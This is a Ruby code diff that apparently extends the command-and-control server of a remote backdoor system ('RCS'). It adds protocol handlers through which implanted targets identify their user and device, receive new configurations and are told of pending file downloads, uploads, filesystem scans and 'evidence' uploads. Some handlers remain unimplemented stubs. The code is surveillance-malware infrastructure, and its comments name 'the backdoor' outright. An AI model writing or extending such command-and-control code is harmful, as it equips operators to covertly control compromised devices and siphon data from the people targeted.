@@ -3,7 +3,9 @@
 #
 
 # relatives
+require_relative 'db.rb'
 require_relative 'sessions.rb'
+require_relative 'pusher.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -22,16 +24,20 @@ module Commands
   PROTO_OK         = 0x01       # OK
   PROTO_NO         = 0x02       # Nothing available
   PROTO_BYE        = 0x03       # The end of the protocol
-  PROTO_CHALLENGE  = 0x04       # Authentication
   PROTO_ID         = 0x0f       # Identification of the target
   PROTO_CONF       = 0x07       # New configuration
   PROTO_UNINSTALL  = 0x0a       # Uninstall command
   PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
   PROTO_UPLOAD     = 0x0d       # A file to be saved
-  PROTO_EVIDENCE   = 0x09       # Upload of a log
+  PROTO_EVIDENCE   = 0x09       # Upload of an evidence
   PROTO_FILESYSTEM = 0x19       # List of paths to be scanned
 
   LOOKUP = { PROTO_ID => :command_id,
+             PROTO_CONF => :command_conf,
+             PROTO_UPLOAD => :command_upload,
+             PROTO_DOWNLOAD => :command_download,
+             PROTO_FILESYSTEM => :command_filesystem,
+             PROTO_EVIDENCE => :command_evidence,
              PROTO_BYE => :command_bye}
 
   # Protocol Identification
@@ -47,25 +53,29 @@ module Commands
 
     trace :info, "[#{peer}][#{session[:cookie]}] Identification: #{version} '#{user_id}' '#{device_id}' '#{source_id}'"
 
-    # notify the database that the sync is in progress
-    DB.instance.sync_for session[:bid], version, user_id, device_id, source_id, Time.now
+    # notify the pusher that the sync is in progress    
+    Pusher.instance.sync_for session, version, user_id, device_id, source_id, Time.now
 
-    #TODO pusher create dir
-    
+    # response to the request
     command = [PROTO_OK].pack('i')
 
     # the time of the server to synchronize the clocks
     time = [Time.new.to_i].pack('q')
 
     available = ""
-    #TODO: ask to the db
-    #available = [PROTO_CONF].pack('i')
+    # ask to the db if there are any availables for the backdoor
+    # the results are actually downloaded and saved locally
+    # we will retrieve the content when the backdoor ask for them later
+    available += [PROTO_CONF].pack('i') if DB.instance.new_conf? session[:bid]
+    available += [PROTO_DOWNLOAD].pack('i') if DB.instance.new_download? session[:bid]
+    available += [PROTO_UPLOAD].pack('i') if DB.instance.new_upload? session[:bid]
+    available += [PROTO_FILESYSTEM].pack('i') if DB.instance.new_filesystem? session[:bid]
 
     # calculate the total size of the response
     tot = time.length + 4 + available.length
 
     # prepare the response
-    response = command + [tot].pack('i') + time + [available.length].pack('i') + available
+    response = command + [tot].pack('i') + time + [available.length / 4].pack('i') + available
 
     return response
   end
@@ -74,14 +84,52 @@ module Commands
   # -> PROTO_BYE
   # <- PROTO_OK
   def command_bye(peer, session, message)
-    trace :info, "[#{peer}][#{session[:cookie]}] Synchronization completed"
+
+    # notify the pusher that the sync has ended
+    Pusher.instance.sync_end session
 
     # destroy the current session
     SessionManager.instance.delete(session[:cookie])
 
-    #TODO pusher not syncing
-    
+    trace :info, "[#{peer}][#{session[:cookie]}] Synchronization completed"
+
     return [PROTO_OK].pack('i')
+  end
+
+  # -> PROTO_CONF
+  # <- PROTO_NO | PROTO_OK [ Conf ]
+  def command_conf(peer, session, message)
+
+    trace :info, "[#{peer}][#{session[:cookie]}] Configuration request"
+
+    # the conf was already retrieved (if any) during the ident phase
+    # here we get just the content (locally) without asking again to the db
+    conf = DB.instance.new_conf session[:bid]
+
+    # send the response
+    if conf.nil? then
+      trace :info, "[#{peer}][#{session[:cookie]}] NO new configuration"
+      response = [PROTO_NO].pack('i')
+    else
+      trace :info, "[#{peer}][#{session[:cookie]}] New configuration (#{conf.length} bytes)"
+      response = [PROTO_OK].pack('i') + [conf.length].pack('i') + conf
+    end
+
+    return response
+  end
+
+
+  def command_upload(peer, session, message)
+    #TODO: implement
+  end
+  def command_download(peer, session, message)
+    #TODO: implement
+  end
+  def command_filesystem(peer, session, message)
+    #TODO: implement
+  end
+  def command_evidence(peer, session, message)
+    #TODO: implement
   end
 
 end #Commands
